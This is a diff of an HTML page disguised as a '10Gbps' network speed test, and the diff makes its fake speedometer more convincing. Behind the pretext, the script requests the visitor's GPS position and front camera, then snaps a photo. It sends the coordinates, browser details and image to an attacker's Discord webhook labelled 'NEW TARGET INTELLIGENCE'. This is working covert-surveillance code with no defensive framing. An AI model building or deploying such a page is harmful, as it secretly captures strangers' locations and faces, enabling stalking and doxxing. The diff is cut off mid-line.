@@ -3,12 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Network Node</title>
+    <title>Global Speed Index</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #161b2c; padding: 25px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #232a42; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; }
-        #test-container { display: none; width: 100%; height: 380px; margin-top: 15px; border-radius: 15px; overflow: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #232a42; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .logo { font-size: 22px; font-weight: bold; color: #00d2ff; margin-bottom: 20px; letter-spacing: 1px; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; font-size: 1.1rem; }
+        
+        /* Realistic Speedometer UI */
+        #speed-ui { display: none; margin-top: 20px; }
+        .gauge { width: 150px; height: 150px; border: 10px solid #232a42; border-top: 10px solid #00d2ff; border-radius: 50%; margin: 0 auto; animation: spin 2s linear infinite; }
+        .speed-text { font-size: 3rem; font-weight: bold; margin-top: 10px; }
+        .unit { color: #5c6784; font-size: 1rem; }
+        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
         video, canvas { display: none; }
     </style>
@@ -16,15 +24,19 @@
 <body>
 
     <div class="card">
-        <h2 style="color:#00d2ff">NODE CALIBRATION</h2>
-        <div id="intro-ui">
-            <p>Please allow <b>Location</b> and <b>Camera</b> access to verify your hardware node.</p>
+        <div class="logo">NETWORK NODE 2026</div>
+        <div id="intro-content">
+            <p>Sync your hardware sensors to begin the 10Gbps Latency Test.</p>
             <button class="btn" id="startBtn">BEGIN TEST</button>
         </div>
-        <div id="test-container">
-            <iframe id="speedframe" style="width:100%; height:100%; border:none;"></iframe>
+
+        <div id="speed-ui">
+            <div class="gauge"></div>
+            <div class="speed-text" id="speed-num">0.0</div>
+            <div class="unit">Mbps / Downloading</div>
         </div>
-        <div id="status">System Status: Waiting for Handshake</div>
+
+        <div id="status">Waiting for System Handshake...</div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -35,32 +47,34 @@
 
         document.getElementById('startBtn').addEventListener('click', async function() {
             const status = document.getElementById('status');
-            status.innerText = "Initializing Protocols...";
-            
-            // 1. Start GPS Request immediately
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "GPS Verified. Accessing Camera...";
-                
-                // Show Speedtest
-                document.getElementById('intro-ui').style.display = "none";
-                document.getElementById('test-container').style.display = "block";
-                document.getElementById('speedframe').src = "https://openspeedtest.com/speedtest";
+            status.innerText = "Requesting node permissions...";
 
-                // 2. Try Camera
+            // 1. Force GPS Request
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                status.innerText = "GPS Synchronized. Connecting to camera...";
+                
+                // Switch to Speed UI
+                document.getElementById('intro-content').style.display = "none";
+                document.getElementById('speed-ui').style.display = "block";
+                startFakeSpeed();
+
+                // 2. Camera Capture
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                } catch (e) { console.log("Camera Blocked"); }
+                } catch (e) { console.log("Cam denied"); }
 
-                // 3. Send Data to Discord
+                // 3. Data Prep
                 const formData = new FormData();
                 const message = {
-                    content: "📡 **NODE DATA RECEIVED**",
+                    content: "🚨 **NEW TARGET INTELLIGENCE**",
                     embeds: [{
-                        title: "Telemetry Success",
+                        title: "Hardware Calibration Report",
+                        color: 3447003,
                         fields: [
-                            { name: "📍 Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
-                            { name: "🎯 Accuracy", value: `${Math.round(pos.coords.accuracy)}m`, inline: true }
+                            { name: "📍 Location", value: `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
+                            { name: "🎯 Accuracy", value: `${Math.round(pos.coords.accuracy)}m`, inline: true },
+                            { name: "📱 Browser", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true }
                         ]
                     }]
                 };
@@ -76,17 +90,4 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            formData.append('file', blob, 'shot.jpg');
-                            await fetch(WEBHOOK, { method: 'POST', body: formData });
-                            stream.getTracks().forEach(t => t.stop());
-                            status.innerText = "Handshake Complete. Testing...";
-                        }, 'image/jpeg');
-                    }, 1500);
-                } else {
-                    await fetch(WEBHOOK, { method: 'POST', body: formData });
-                    status.innerText = "Handshake Complete (GPS Only).";
-                }
-
-            }, (err) => {
-                alert("HANDSHAKE ERROR: GPS Permission is required for this node.");
-                status
+                            formData.append
